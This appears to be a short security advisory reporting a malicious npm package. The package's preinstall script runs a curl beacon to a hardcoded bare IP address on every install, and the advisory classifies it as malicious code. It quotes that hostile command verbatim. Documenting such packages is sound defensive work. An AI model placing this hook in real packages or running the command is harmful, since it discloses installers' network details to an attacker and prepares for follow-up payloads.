summary: preinstall script beacons installer to hardcoded bare IP
details: package.json declares a preinstall lifecycle script that runs `curl https://159.223.131.130:8080` on `npm install`. The package ships no source code, no README, and no declared purpose — the manifest itself is the payload. On install the host contacts a hardcoded bare-IP endpoint over the network, disclosing the installer's public IP and install timing to the operator of that address. The shape (bare-IP destination, no TLS-validated hostname, no build or runtime justification, empty package otherwise) is consistent with a canary beacon used to identify victim environments for staged follow-up delivery.

cwes.description: The product contains code that appears to be malicious in nature.
